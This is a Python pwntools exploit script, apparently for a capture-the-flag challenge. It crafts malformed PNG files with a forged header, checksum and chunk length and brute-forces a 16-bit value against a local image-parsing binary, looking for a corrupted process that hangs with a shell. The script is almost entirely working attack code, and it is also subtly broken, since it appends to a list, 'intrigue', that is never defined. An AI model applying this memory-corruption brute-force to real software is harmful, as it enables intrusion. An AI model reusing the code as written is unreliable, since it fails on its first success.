from pwn import *                                                                                                                    
import time

context.log_level = 'error'

##Gdb + config stuff
script = '''
b *main+160
b *pngHeadValidate
b *update_crc
b *update_crc+98
b *pngChunkValidate+27
b *pngChunkValidate+160
b *pngHeadValidate+244
b *main+449
continue
'''

## Making the image
# Size of image, but also size of the allocation
img_sz = 0x20 + 1 + (8)
# For passing the first check
pngHead = 0x0a1a0a0d474e5089
# We need this @ index 29
checksum = 0x5ab9bc8a

# Padding

def main():
    # Connect/start proc
    
    for i in range(0, 0xffff):
        
        png = p64(pngHead) + b"\r" * (7)
        png += b"A"*( 29 - len(png) )
        png += p32(checksum)
        png += b"\x00"*3 + b"\x27" 
        png += p32(i) 
        png += b"\x00" * (img_sz - len(png)) 
        
        p = process("./chal")
    
        #print(p.sendlineafter("How large is your file?\n\n", str(img_sz)))
        p.sendlineafter("How large is your file?\n\n", str(img_sz))
        #p.sendline(str(img_sz))
        
        p.sendafter("please send your image here:\n\n", png)
        
        p.sendlineafter("do you want to invert the colors?", "y")

        # Should increase this if you need more reliability
        time.sleep(0.05)
        retval = p.poll()
        
        # If the process hangs instead of exiting, we may have overwrote something in a good way ;) (shells hang)
        if (retval == None):
            
            print("Returned: " + str(retval))
            print(str(i) + " In: " + str(hex(i)))
            print("!!!!!!!!!!!!!!!!")
            intrigue.append(i)

        p.close()

if __name__ == "__main__":
    main()